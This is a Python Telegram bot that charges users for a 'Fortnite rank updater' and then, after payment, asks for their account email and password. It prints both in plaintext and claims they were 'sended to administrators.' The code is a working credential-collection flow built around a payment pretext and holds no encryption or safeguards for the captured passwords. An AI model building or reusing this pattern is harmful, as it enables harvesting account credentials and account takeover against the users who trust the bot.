import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from config import TOKEN, PROVIDER_TOKEN
from aiogram.fsm.state import StatesGroup, State
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, LabeledPrice, PreCheckoutQuery, ContentType
from aiogram.fsm.context import FSMContext
import keyboards as kb

bot = Bot(token=TOKEN)
dp = Dispatcher()

class emails(StatesGroup):
    mail = State()
    password = State()


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await bot.send_message(message.from_user.id, 'Hello')

PRICE = LabeledPrice(label="Fortnite rank updater to Gold", amount=30*100)  # в копейках (руб)

@dp.message(Command('buy'))
async def buy(message: Message):
    await bot.send_invoice(message.from_user.id,
                           title="Update rank in Fortnite to Fortnite_rank Gold",
                           description="I am logging to your account and update your rank on account. To Fortnite_rank Gold",
                           provider_token=PROVIDER_TOKEN,
                           currency="rub",
                           photo_url="https://cdn-icons-png.flaticon.com/512/1151/1151301.png",
                           photo_width=416,
                           photo_height=234,
                           photo_size=416,
                           is_flexible=False,
                           prices=[PRICE],
                           start_parameter="fortnite-rank-updater-to-gold",
                           payload="fortnite-rank-updater-to-gold")

@dp.pre_checkout_query()
async def pre_checkout_query(precheckoutq: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(precheckoutq.id, ok=True)

@dp.message(F.successful_payment)
async def successful_payment(message: Message, state: FSMContext):
    payment_info = message.successful_payment
    print(payment_info)
    await bot.send_message(message.from_user.id, 'Please send your email!')
    await state.set_state(emails.mail)

@dp.message(emails.mail)
async def basedatapassword(message: Message, state: FSMContext):
    await state.update_data(mail=message.text)
    await state.set_state(emails.password)
    await bot.send_message(message.from_user.id, 'Please send your password!')

@dp.message(emails.password)
async def okay(message: Message, state: FSMContext):
    await state.update_data(password=message.text)
    data = await state.get_data()
    await bot.send_message(message.from_user.id, f'<b><u>You have this data?\nEmail: {data["mail"]}\nPassword: {data["password"]}</u></b>', 
                           reply_markup=kb.Confirming_markup, parse_mode='html')
    
@dp.callback_query(F.data == 'cancelmark')
async def emailpass(message: Message, state: FSMContext):
    await state.set_state(emails.mail)
    await bot.send_message(message.from_user.id, 'Please send your email!')

@dp.callback_query(F.data == 'confirmingmark')
async def confirmed_payment(message: Message, state: FSMContext):
    data = await state.get_data()
    await bot.send_message(message.from_user.id, '<b><u>Data successfully is sended to administrators. Please wait...</u></b>', parse_mode='html')
    print(data["mail"], data["password"])
    await state.clear()

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print('Exit')